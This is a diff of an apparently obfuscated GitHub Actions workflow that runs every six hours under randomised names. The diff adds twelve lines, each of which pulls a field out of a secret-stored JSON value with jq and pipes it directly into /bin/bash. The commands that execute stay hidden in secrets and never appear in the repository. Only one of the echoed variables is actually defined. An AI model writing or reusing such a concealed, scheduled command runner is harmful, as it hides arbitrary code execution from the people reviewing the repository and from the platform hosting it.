@@ -2,7 +2,8 @@ name: wangyuse3478
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 3/6 * * *'
+    - cron: '47 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangyuse3478
         env:
-          nhk039: ${{ secrets.nhk039 }}
+          pyc80: ${{ secrets.pyc80 }}
         run: |
-          echo $nhk039 | jq -r .ouj42587 | /bin/bash
-          echo $fuhc1802 | jq -r .tkw04573 | /bin/bash
-          echo $heuw40173 | jq -r .ayljs9771 | /bin/bash
-          echo $xasab37 | jq -r .dcwnz73 | /bin/bash
-          echo $k55422 | jq -r .u4140 | /bin/bash
-          echo $sa06655 | jq -r .i48542 | /bin/bash
-          echo $qwjx7 | jq -r .nwkne503 | /bin/bash
+          echo $pyc80 | jq -r .yfd9062 | /bin/bash
+          echo $yons35750 | jq -r .r58 | /bin/bash
+          echo $ljae85615 | jq -r .jsxv3580 | /bin/bash
+          echo $l39592 | jq -r .aeok01 | /bin/bash
+          echo $z6895 | jq -r .u46 | /bin/bash
+          echo $qgck685 | jq -r .dppwn83 | /bin/bash
+          echo $owbqj86 | jq -r .t3 | /bin/bash
+          echo $r4580 | jq -r .j41211 | /bin/bash
+          echo $ga4 | jq -r .uyxnc24419 | /bin/bash
+          echo $xggyb9 | jq -r .qknk72445 | /bin/bash
+          echo $ymc66 | jq -r .i8926 | /bin/bash
+          echo $ge0 | jq -r .xtvd736 | /bin/bash
 
